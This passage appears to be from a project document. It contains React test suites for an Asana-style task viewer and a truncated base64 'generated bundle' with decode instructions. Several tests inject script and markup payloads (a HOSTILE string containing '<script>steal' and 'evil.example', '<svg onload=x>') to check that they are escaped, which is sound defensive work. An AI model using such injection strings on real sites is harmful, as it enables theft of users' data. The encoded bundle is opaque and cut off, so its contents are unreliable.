    const out = renderHeader({ title: HOSTILE });
    expect(out).toContain("&lt;script&gt;");
    expect(out).toContain("evil.example");
    expect(out).not.toContain("<script>steal");
    expect(out).not.toContain('<img src="/logo.png"');
  });

  it("renders the due RANGE verbatim with the spaced en dash", () => {
    expect(renderHeader()).toContain("Sep 28, 2025 – Oct 17, 2025");
  });

  it("tints overdue dates", () => {
    expect(renderHeader({ overdue: true })).toContain("tk-due--overdue");
    expect(renderHeader({ overdue: false })).not.toContain("tk-due--overdue");
  });

  it("completed state shows the green banner and the ✓ Completed button", () => {
    const out = renderHeader({ completed: true });
    expect(out).toContain("✓ Completed");
    expect(out).toContain("tk-banner");
    expect(out).toContain("tk-complete-btn--done");
  });

  it("open state shows Mark complete and no banner", () => {
    const out = renderHeader({ completed: false });
    expect(out).toContain("✓ Mark complete");
    expect(out).not.toContain("tk-banner");
  });

  it("stacks assignee + collaborators with a +N overflow disc", () => {
    const out = renderHeader();
    // assignee + 4 collaborators, max 4 shown → +1
    expect(out).toContain("tk-avatar-more");
    expect(out).toContain("+1");
  });

  it("shows the Recently assigned affordance and the project · section row", () => {
    const out = renderHeader();
    expect(out).toContain("Recently assigned ▾");
    expect(out).toContain("CX Requests");
    expect(out).toContain("· Complete ▾");
  });

  it("shows freshness and the permalink", () => {
    const out = renderHeader();
    expect(out).toContain("Updated 5m ago");
    expect(out).toContain("Open in Asana ›");
  });

  it("renders a status pill when present", () => {
    const out = renderHeader({ status_pill: { text: "On track", color: "green" } });
    expect(out).toContain("On track");
    expect(out).toContain("tk-pill--green");
  });

  it("disables Mark complete without the capability", () => {
    const out = renderHeader({ completed: false }, CAPS_OFF);
    expect(out).toMatch(/<button[^>]*class="tk-complete-btn"[^>]*disabled/);
  });

  it("relays toggle with the flipped completed state", () => {
    const asked = [];
    const tree = Header({
      header: { ...VM.header, completed: false }, capabilities: CAPS_ON, busy: false,
      onToggleComplete: (d) => asked.push(d), onRefresh: noop, onOpenUrl: noop, onSetDue: noop,
    });
    const btns = collectElements(tree, (n) =>
      n.type === "button" && String(n.props.className || "").includes("tk-complete-btn"));
    btns[0].props.onClick();
    expect(asked).toEqual([true]);
  });

  it("assignee empty renders the em dash", () => {
    expect(renderHeader({ assignee: null })).toContain("—");
  });
});

// ------------------------------------------------------------- FieldGrid

function renderGrid(fields = VM.fields, hidden = false) {
  return renderToStaticMarkup(
    <FieldGrid fields={fields} hidden={hidden} onToggleHidden={noop} />);
}

describe("FieldGrid", () => {
  it("renders all 20 field names uncapped", () => {
    const out = renderGrid();
    for (const f of VM.fields) expect(out).toContain(f.name);
  });

  it("renders em dashes for empty values", () => {
    const out = renderGrid();
    expect(out).toContain("Draft URL");
    expect((out.match(/tk-empty/g) || []).length).toBeGreaterThanOrEqual(3);
  });

  it("renders enum pills with their palette classes", () => {
    const out = renderGrid();
    expect(out).toContain("tk-pill--green");
    expect(out).toContain("tk-pill--red");
    expect(out).toContain("Guru: Update");
  });

  it("renders people fields as avatar + name", () => {
    const out = renderGrid();
    expect(out).toContain("Priya Nair");
    expect(out).toContain("tk-field-person");
  });

  it("renders checkbox glyphs with the on-state class", () => {
    const out = renderGrid();
    expect(out).toContain("☑");
    expect(out).toContain("☐");
    expect(out).toContain("tk-checkbox--on");
  });

  it("hidden collapses rows and flips the toggle wording", () => {
    const shown = renderGrid(VM.fields, false);
    const hidden = renderGrid(VM.fields, true);
    expect(shown).toContain("Hide custom fields");
    expect(hidden).toContain("Show custom fields");
    expect(hidden).not.toContain("Guru: Update");
  });

  it("toggle click relays", () => {
    const asked = [];
    const tree = FieldGrid({
      fields: VM.fields, hidden: false, onToggleHidden: () => asked.push(1),
    });
    const btns = collectElements(tree, (n) =>
      n.type === "button" && String(n.props.className || "").includes("tk-fields-toggle"));
    btns[0].props.onClick();
    expect(asked).toEqual([1]);
  });

  it("renders hostile names and values as ESCAPED TEXT", () => {
    const vm = normalizeData({ fields: [
      { name: HOSTILE, kind: "text", value: '<svg onload=x>' },
    ] });
    const out = renderGrid(vm.fields);
    expect(out).toContain("&lt;script&gt;");
    expect(out).not.toContain("<script>steal");
    expect(out).not.toContain("<svg");
  });

  it("renders nothing for an empty field list", () => {
    expect(renderGrid([])).toBe("");
  });
});

// ----------------------------------------------------------- Description

describe("Description sandbox contract", () => {
  it("renders an iframe with an EMPTY sandbox (no scripts, no origin)", () => {
    const out = renderToStaticMarkup(<Description srcdoc="<p>hi</p>" />);
    expect(out).toContain('sandbox=""');
    expect(out).not.toContain("allow-scripts");
    expect(out).not.toContain("allow-same-origin");
  });

  it("carries the content via srcdoc", () => {
    const out = renderToStaticMarkup(<Description srcdoc="<h2>Steps</h2>" />);
    expect(out.toLowerCase()).toContain("srcdoc=");
    expect(unescapeAttr(out)).toContain("<h2>Steps</h2>");
  });

  it("keeps hostile bytes inside the escaped srcdoc attribute only", () => {
    const out = renderToStaticMarkup(<Description srcdoc={HOSTILE} />);
    expect(out).toContain('sandbox=""');
    expect(out).not.toContain("<script>steal");
    expect(out).not.toContain('<img src="/logo.png"');
  });

  it("renders nothing when empty and not editable", () => {
    expect(renderToStaticMarkup(<Description srcdoc="" canEdit={false} />)).toBe("");
  });

  it("shows the Edit affordance when editable, and the editor on demand", () => {
    const base = {
      srcdoc: "<p>body</p>", markdown: "body", canEdit: true, busy: false,
      onEdit: noop, onCancel: noop, onSave: noop,
    };
    const view = renderToStaticMarkup(<Description {...base} editing={false} />);
    expect(view).toContain(">Edit</button>");
    expect(view).toContain('sandbox=""');
    const edit = renderToStaticMarkup(<Description {...base} editing={true} />);
    expect(edit).toContain("tk-desc-input");
    expect(edit).toContain(">body</textarea>");
    expect(edit).toContain(">Save</button>");
    expect(edit).toContain(">Cancel</button>");
    expect(edit).not.toContain("<iframe");
  });

  it("empty-but-editable shows the Asana placeholder affordance", () => {
    const out = renderToStaticMarkup(
      <Description srcdoc="" markdown="" canEdit={true} editing={false}
                   busy={false} onEdit={noop} onCancel={noop} onSave={noop} />);
    expect(out).toContain("What is this task about?");
  });

  it("editor save relays the textarea markdown; hostile markdown stays escaped", () => {
    const asked = [];
    const tree = Description({
      srcdoc: "<p>x</p>", markdown: HOSTILE, canEdit: true, editing: true,
      busy: false, onEdit: noop, onCancel: noop, onSave: (md) => asked.push(md),
    });
    const forms = collectElements(tree, (n) => n.type === "form");
    forms[0].props.onSubmit({
      preventDefault: noop,
      currentTarget: { elements: { desc: { value: "## edited body" } } },
    });
    expect(asked).toEqual(["## edited body"]);
    const out = renderToStaticMarkup(
      <Description srcdoc="" markdown={HOSTILE} canEdit={true} editing={true}
                   busy={false} onEdit={noop} onCancel={noop} onSave={noop} />);
    expect(out).toContain("&lt;script&gt;");
    expect(out).not.toContain("<script>steal");
  });

  it("renders the form-structured demo description", () => {
    const out = unescapeAttr(renderToStaticMarkup(<Description srcdoc={VM.description.srcdoc} />));
    expect(out).toContain("<strong>Describe your request.</strong>");
    expect(out).toContain("Care Navigators");
  });
});

// -------------------------------------------------------------- Subtasks

function renderSubs(subtasks = VM.subtasks, caps = CAPS_ON) {
  return renderToStaticMarkup(
    <Subtasks subtasks={subtasks} capabilities={caps} busy={false}
              onAdd={noop} onToggle={noop} onOpen={noop} />);
}

describe("Subtasks", () => {
  it("renders names with done styling and the promoted ↳ marker", () => {
    const out = renderSubs();
    expect(out).toContain("Update Guru card draft");
    expect(out).toContain("tk-subtask-name--done");
    expect(out).toContain("↳");
  });

  it("renders assignee and due meta", () => {
    const out = renderSubs();
    expect(out).toContain("Marcus Lee");
    expect(out).toContain("Aug 12");
  });

  it("shows the composer with the exact Asana placeholder", () => {
    expect(renderSubs()).toContain("Type to add a subtask…");
  });

  it("hides the composer without the capability", () => {
    expect(renderSubs(VM.subtasks, CAPS_OFF)).not.toContain("Type to add a subtask…");
  });

  it("renders nothing with no rows and no capability", () => {
    expect(renderSubs([], CAPS_OFF)).toBe("");
  });

  it("submit relays trimmed text and resets the form", () => {
    const asked = [];
    const resets = [];
    const tree = Subtasks({
      subtasks: [], capabilities: CAPS_ON, busy: false, onAdd: (t) => asked.push(t),
    });
    const forms = collectElements(tree, (n) => n.type === "form");
    forms[0].props.onSubmit({
      preventDefault: noop,
      currentTarget: {
        elements: { subtask: { value: "  New rollout step  " } },
        reset: () => resets.push(1),
      },
    });
    expect(asked).toEqual(["New rollout step"]);
    expect(resets).toEqual([1]);
  });

  it("renders hostile subtask names as ESCAPED TEXT", () => {
    const vm = normalizeData({ subtasks: [{ name: HOSTILE }] });
    const out = renderSubs(vm.subtasks);
    expect(out).toContain("&lt;script&gt;");
    expect(out).not.toContain("<script>steal");
  });

  it("Asana-linked rows get a clickable check circle; unlinked rows do not", () => {
    const out = renderSubs();
    // fixture rows all carry gids → buttons with the mirror titles
    expect(out).toContain("tk-subcheck--btn");
    expect(out).toContain('title="Mark complete"');
    expect(out).toContain('title="Mark incomplete"');
    const unlinked = normalizeData({ subtasks: [{ name: "Local only" }] });
    const out2 = renderSubs(unlinked.subtasks);
    expect(out2).not.toContain("tk-subcheck--btn");
  });

  it("no toggle affordance without the subtask capability", () => {
    expect(renderSubs(VM.subtasks, CAPS_OFF)).not.toContain("tk-subcheck--btn");
  });

  it("linked subtask names are navigation buttons; unlinked stay text", () => {
    const out = renderSubs();
    expect(out).toContain("tk-subtask-link");     // fixture rows carry gids
    const unlinked = normalizeData({ subtasks: [{ name: "Local only" }] });
    expect(renderSubs(unlinked.subtasks)).not.toContain("tk-subtask-link");
  });

  it("subtask name click relays its gid", () => {
    const asked = [];
    const tree = Subtasks({
      subtasks: normalizeData({ subtasks: [{ name: "Child", gid: "s1" }] }).subtasks,
      capabilities: CAPS_ON, busy: false, onAdd: noop, onToggle: noop,
      onOpen: (gid) => asked.push(gid),
    });
    const names = collectElements(tree, (n) =>
      n.type && n.type.name === "SubtaskName");
    const inner = names[0].type(names[0].props);
    const btns = collectElements(inner, (n) => n.type === "button");
    btns[0].props.onClick();
    expect(asked).toEqual(["s1"]);
  });

  it("check click relays the gid with the FLIPPED done state", () => {
    const asked = [];
    const onToggle = (gid, done) => asked.push([gid, done]);
    for (const sub of [{ gid: "s1", done: false }, { gid: "s2", done: true }]) {
      const tree = CheckCircle({ sub, canToggle: true, busy: false, onToggle });
      const btns = collectElements(tree, (n) => n.type === "button");
      btns[0].props.onClick();
    }
    expect(asked).toEqual([["s1", true], ["s2", false]]);
  });
});

// --------------------------------------------------------------- AppsRow

describe("AppsRow", () => {
  it("maps hosts to app labels", () => {
    expect(hostLabel("slack")).toBe("Slack");
    expect(hostLabel("gdrive")).toBe("Google Drive");
    expect(hostLabel("zendesk")).toBe("Zendesk");
    expect(hostLabel("asana")).toBe("");
    expect(hostLabel("mystery")).toBe("");
  });

  it("splits app rows from plain attachment chips", () => {
    const out = renderToStaticMarkup(
      <AppsRow attachments={VM.attachments} resolving="" onOpenAttachment={noop} />);
    expect(out).toContain("Slack");
    expect(out).toContain("Google Drive");
    expect(out).toContain("Zendesk");
    expect(out).toContain("tier-table-v2.png ›");
  });

  it("shows the resolving state on the clicked attachment", () => {
    const out = renderToStaticMarkup(
      <AppsRow attachments={VM.attachments} resolving="a2" onOpenAttachment={noop} />);
    expect(out).toContain("Copay comms plan — resolving…");
  });

  it("click relays the attachment gid", () => {
    const asked = [];
    const tree = AppsRow({
      attachments: VM.attachments, resolving: "", onOpenAttachment: (g) => asked.push(g),
    });
    const btns = collectElements(tree, (n) => n.type === "button");
    btns.forEach((b) => b.props.onClick());
    expect(asked).toEqual(["a1", "a2", "a3", "a4"]);
  });

  it("renders hostile attachment names as ESCAPED TEXT", () => {
    const vm = normalizeData({ attachments: [{ gid: "x", name: HOSTILE, host: "slack" }] });
    const out = renderToStaticMarkup(
      <AppsRow attachments={vm.attachments} resolving="" onOpenAttachment={noop} />);
    expect(out).toContain("&lt;script&gt;");
    expect(out).not.toContain("<script>steal");
  });

  it("renders nothing for an empty list", () => {
    expect(renderToStaticMarkup(
      <AppsRow attachments={[]} resolving="" onOpenAttachment={noop} />)).toBe("");
  });
});

// -------------------------------------------------------------- Activity

function renderFeed(over = {}) {
  const props = {
    stories: VM.stories, tab: "all", oldestFirst: true, expanded: true,
    capabilities: CAPS_ON, busy: false,
    onTab: noop, onSort: noop, onExpand: noop, onPostComment: noop, onOpenUrl: noop,
    ...over,
  };
  return renderToStaticMarkup(<Activity {...props} />);
}

describe("Activity", () => {
  it("renders comment rows with author, timestamp and body", () => {
    const out = renderFeed();
    expect(out).toContain("Jordan Avery");
    expect(out).toContain("Jul 2, 9:14 AM");
    expect(out).toContain("Kicking this off");
  });

  it("falls back to someone for authorless comments", () => {
    const vm = normalizeData({ stories: [{ kind: "comment", text: "hi", when: "now" }] });
    expect(renderFeed({ stories: vm.stories })).toContain("someone");
  });

  it("renders mention chips and link tokens", () => {
    const out = renderFeed();
    expect(out).toContain("@Dana Whitfield");
    expect(out).toContain("tk-token-mention");
    expect(out).toContain("Copay update outline");
    expect(out).toContain("tk-token-link");
  });

  it("renders automation rows with the bolt glyph", () => {
    const out = renderFeed();
    expect(out).toContain("⚡");
    expect(out).toContain("When Task is overdue");
    expect(out).toContain("tk-story--automation");
  });

  it("renders system rows with the bold actor", () => {
    const out = renderFeed();
    expect(out).toContain("completed this task");
    expect(out).toContain("tk-story-actor");
  });

  it("the Comments tab filters automation and system rows out", () => {
    const out = renderFeed({ tab: "comments" });
    expect(out).not.toContain("⚡");
    expect(out).not.toContain("completed this task");
    expect(out).toContain("Kicking this off");
  });

  it("collapses the middle of a long comment feed to 10 more comments", () => {
    const out = renderFeed({ tab: "comments", expanded: false });
    expect(out).toContain("10 more comments");
    expect(out).toContain("Kicking this off");            // head survives
    expect(out).toContain("Reminder: mirror copies");     // tail survives
    expect(out).not.toContain("Billing review done");     // middle hidden
  });

  it("expanded shows the whole feed", () => {
    const out = renderFeed({ tab: "comments", expanded: true });
    expect(out).not.toContain("more comments");
    expect(out).toContain("Billing review done");
  });

  it("sort control reflects direction", () => {
    expect(renderFeed({ oldestFirst: true })).toContain("Oldest ↑↓");
    expect(renderFeed({ oldestFirst: false })).toContain("Newest ↑↓");
  });

  it("newest-first puts the latest story before the first", () => {
    const out = renderFeed({ oldestFirst: false, expanded: true });
    const first = out.indexOf("moved this task from New Requests");
    const kickoff = out.indexOf("Kicking this off");
    expect(first).toBeGreaterThan(-1);
    expect(first).toBeLessThan(kickoff);
  });

  it("renders the composer with the Asana placeholder and Comment button", () => {
    const out = renderFeed();
    expect(out).toContain("Ask a question or post an update…");
    expect(out).toContain(">Comment</button>");
  });

  it("hides the composer without the capability", () => {
    expect(renderFeed({ capabilities: CAPS_OFF })).not.toContain("Ask a question");
  });

  it("submit relays trimmed comment text and resets", () => {
    const asked = [];
    const resets = [];
    const tree = Activity({
      stories: [], tab: "all", oldestFirst: true, expanded: true,
      capabilities: CAPS_ON, busy: false,
      onTab: noop, onSort: noop, onExpand: noop, onOpenUrl: noop,
      onPostComment: (t) => asked.push(t),
    });
    const forms = collectElements(tree, (n) => n.type === "form");
    forms[0].props.onSubmit({
      preventDefault: noop,
      currentTarget: {
        elements: { comment: { value: " Shipping today. " } },
        reset: () => resets.push(1),
      },
    });
    expect(asked).toEqual(["Shipping today."]);
    expect(resets).toEqual([1]);
  });

  it("tab and expand controls relay", () => {
    const tabs = [];
    const expands = [];
    const tree = Activity({
      stories: VM.stories, tab: "comments", oldestFirst: true, expanded: false,
      capabilities: CAPS_OFF, busy: false,
      onTab: (t) => tabs.push(t), onSort: noop, onExpand: () => expands.push(1),
      onPostComment: noop, onOpenUrl: noop,
    });
    const btns = collectElements(tree, (n) => n.type === "button");
    btns.forEach((b) => b.props.onClick && b.props.onClick());
    expect(tabs).toEqual(["comments", "all"]);
    expect(expands).toEqual([1]);
  });

  it("renders hostile comment tokens as ESCAPED TEXT, never as markup", () => {
    const vm = normalizeData({ stories: [
      { kind: "comment", when: "now", tokens: [
        { t: "text", v: HOSTILE },
        { t: "link", v: HOSTILE, href: "https://ok.example/" },
        { t: "mention", v: "<b>evil</b>" },
      ] },
    ] });
    const out = renderFeed({ stories: vm.stories });
    expect(out).toContain("&lt;script&gt;");
    expect(out).toContain("&lt;b&gt;evil&lt;/b&gt;");
    expect(out).not.toContain("<script>steal");
    expect(out).not.toContain("<b>evil</b>");
    expect(out).not.toContain("<iframe");
  });

  it("link tokens relay through onOpenUrl instead of navigating", () => {
    const asked = [];
    const tree = TokenText({
      tokens: [{ t: "link", v: "outline", href: "https://docs.example.com/x" }],
      onOpenUrl: (u) => asked.push(u),
    });
    const links = collectElements(tree, (n) => n.type === "a");
    links[0].props.onClick({ preventDefault: noop });
    expect(asked).toEqual(["https://docs.example.com/x"]);
  });
});
~~~~

---

# Appendix B — `src/ui/web/dist/index.html` (generated bundle)

Decoded size 373695 bytes · sha256 `591e78e3ed0088b163c4d7abc114e4c9284ce3fc5755e21c4550e36a33e214dd`.

Save the base64 block below to `/tmp/dist.b64` (strip nothing but the
fence lines), then decode:

~~~~
python3 - <<'EOF'
import base64, gzip, hashlib, pathlib
raw = pathlib.Path('/tmp/dist.b64').read_text()
data = gzip.decompress(base64.b64decode(raw))
pathlib.Path('src/ui/web/dist/index.html').write_bytes(data)
print(hashlib.sha256(data).hexdigest())
EOF
# printed hash MUST be: 591e78e3ed0088b163c4d7abc114e4c9284ce3fc5755e21c4550e36a33e214dd
~~~~

~~~~
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
